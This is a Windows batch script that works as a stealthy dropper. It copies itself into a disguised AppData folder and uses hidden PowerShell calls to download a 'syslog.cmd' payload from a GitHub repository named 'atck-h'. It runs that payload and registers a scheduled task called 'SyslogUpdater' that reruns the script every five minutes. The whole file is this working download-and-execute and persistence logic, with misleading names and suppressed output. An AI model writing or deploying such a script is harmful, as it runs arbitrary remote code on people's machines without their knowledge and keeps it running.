@echo off
setlocal enabledelayedexpansion

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"

if not exist "%BASE%" mkdir "%BASE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" goto RUN

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"
    )
)

:RUN
if exist "%PRANK%" start "" "%PRANK%"

:: Create scheduled task that runs THIS UPDATER every 5 minutes
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal